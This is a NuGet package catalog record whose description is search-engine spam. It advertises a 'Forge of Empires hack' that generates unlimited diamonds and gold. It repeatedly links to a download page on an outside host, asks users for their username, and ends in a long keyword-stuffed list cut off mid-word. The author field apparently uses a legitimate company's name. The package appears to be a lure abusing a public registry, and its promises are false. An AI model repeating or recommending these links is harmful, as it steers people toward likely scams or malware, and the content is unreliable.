{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.12.38/_forge-of-empires-hack-working-2022-version-pka.4.5.44.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "59411a49-eb93-4e54-ba6f-8591a38cd168",
  "catalog:commitTimeStamp": "2022-01-26T11:12:38.8037557Z",
  "created": "2022-01-26T11:09:28.607Z",
  "description": "# _Forge Of Empires Hack Working 2022 Version pka\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://7.bltadwin.ru/hack.php](http://7.bltadwin.ru/hack.php)\n\n\nTodo sobre Forge Of Empires; Hack, atajos, consejos de expertos, guias, eventos, data y todo lo que te puedas imaginar. HOW TO USE FORGE OF EMPIRES HACK! downloadad the program from the link bellow. download the Forge of Empires game in your device and let it run. Forge of Empires Cheats and Hack APK: Forge of Empires Cheats and Hack can give you unlimited free coins, diamonds and supplies generator.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://7.bltadwin.ru/hack.php](http://7.bltadwin.ru/hack.php)\n\nHow To Use Forge of Empires Cheats. 1. Click button “Generate Online”. 2. Enter Username. 3. Select Region. 4. Select the amount of resources. 5. Click „Generate” and wait a few minutes. Forge of Empires Hack doesn’t need to root or jailbreak your product. We’ve several methods how to cheat Forge of Empires and we hold our customers pleased with new automated updates, so you don’t have to worry about Forge of Empires Cheat shall receive ever patched. We are pleased in the event that you were helped by us to cheat Gold, Supplies and Estimated Reading Time: 9 mins. GENERATE Forge Of Empires Unlimited Resources WITH THE FORM BELOW. Enter Your Username. Select The Amount Of Golds To You Want. Select The Amount Of Diamonds To You Want. Select The Amount Of Supplies To You Want. Select Your Device. Welcome to the chatroom, posting links or spamming will result in a kick.\n\nforge of empires hack no human verification, forge of empires hack 2021, forge of empires hacked apk, forge of empires hacked version, forge of empires hack tool, forge of empires hack script, forge of empires hack unlimited diamonds, forge of empires hack mod apk, forge of empires hack apk, forge of empires hack mod apk download, forge of empires hack apk download, forge of empires hack apk latest version, forge of empires hack apk ios, forge of empires hack apk offline, forge of empires hack activation code, forge of empires hack apk 2021, forge of empires hack android, forge of empires hacks, forge of empires hack pc, forge of empires hack download, forge of empires browser hack, forge of empires build your city hack, best way to get forge points in forge of empires, forge of empire hacks, forge of empires cost to unlock ge, forge of empires coin hack, forge of empires cydia hack, forge of empires hack cheat tool adder generator download, forge of empires cheat engine hack, forge of empires build your city hack mod apk, can you hack forge of empires, can i hack forge of empires, forge of empires hack diamonds, forge of empires hack download free, forge of empires hack download pc, forge of empires diamond hack apk, forge of empires hack ios download, forge of empires hack erfahrungen, forge of empires hack for pc, forge of empires hack free, forge of empires hack tool free download, forge of empires hack pc download free, forge of empires free diamonds hack, forge of empires forge points hack, free download forge of empires hack tool v.2.5, forge of empires hack generator, forge of empires gold hack, forge of empires gem hack, forge of empires gvg hack, forge of empires gbg hack, forge of empires hack - online resource generator, forge of empires gyémánt hack, forge of empires hack without human verification, hanseatic league forge of empires hack, how to hack forge of empires pc, how to hack forge of empires with cheat engine, how to hack forge of empires, how to hack forge of empires android, forge of empires hack ios, forge of empires hack iosgods, forge of empires jailbreak hack, kod aktywacyjny do forge of empires hack, forge of empires hack lucky patcher, forge of empires hack mod, forge of empires hack mobile, forge of empires money hack, forge of empires hack magyarul, forge of empires hack no survey, forge of empires hack no verification, forge of empires hack na zloto, forg",
  "id": "_Forge-Of-Empires-Hack-Working-2022-Version-pka",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T11:12:32.387Z",
  "listed": true,
  "packageHash": "T0fap+WS3rSXfnQrj1NRHtHE2uTg35NWkonxc5Itdf8kL6wCPO2m0Ell9Q1YMCa7EaQp5wIDHWv2OcuL09TsHg==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11600,
  "published": "2022-01-26T11:09:28.607Z",
  "requireLicenseAcceptance": false,
  "title": "_Forge-Of-Empires-Hack-Working-2022-Version-pka",
  "verbatimVersion": "4.5.44",
  "version": "4.5.44",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.12.38/_forge-of-empires-hack-working-2022-version-pka.4.5.44.json#rkxkufrywj.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1468,
      "fullName": "rkxkufrywj.nuspec",
      "length": 4479,
      "name": "rkxkufrywj.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.12.38/_forge-of-empires-hack-working-2022-version-pka.4.5.44.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9472,
      "fullName": ".signature.p7s",
      "length": 9472,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}